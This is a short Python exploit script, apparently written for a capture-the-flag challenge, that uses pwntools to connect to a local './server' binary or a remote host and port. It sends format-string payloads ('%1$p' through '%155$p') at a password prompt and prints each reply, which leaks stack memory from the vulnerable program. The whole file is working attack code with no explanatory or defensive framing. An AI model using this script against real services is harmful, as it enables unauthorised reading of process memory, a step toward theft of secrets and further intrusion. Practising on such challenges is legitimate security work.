#!/usr/bin/env python3

import argparse
import pwn

pwn.context.log_level = "critical"

parser = argparse.ArgumentParser()
parser.add_argument("destination", type=str, choices={"local", "remote"})
parser.add_argument("--target", "-t", type=str, default="", required=False)
parser.add_argument("--port", "-p", type=int, default="0", required=False)
args = parser.parse_args()

elf = pwn.ELF("./server")

offset = 64

for i in range(1, 156):
    
    payload = b"".join(
        [
            b"%" + str(i).encode("utf-8") + b"$p",
        ]
    )

    if args.destination == "local":
        p = elf.process()
    elif args.destination == "remote":
        if not args.target or not args.port:
            pwn.warning("trash")
            exit()
        p = pwn.remote(args.target, args.port)
    
    p.recvuntil(b"Enter the password: ")
    p.sendline(payload)
    response = p.recvall().decode("latin-1")
    print(response)
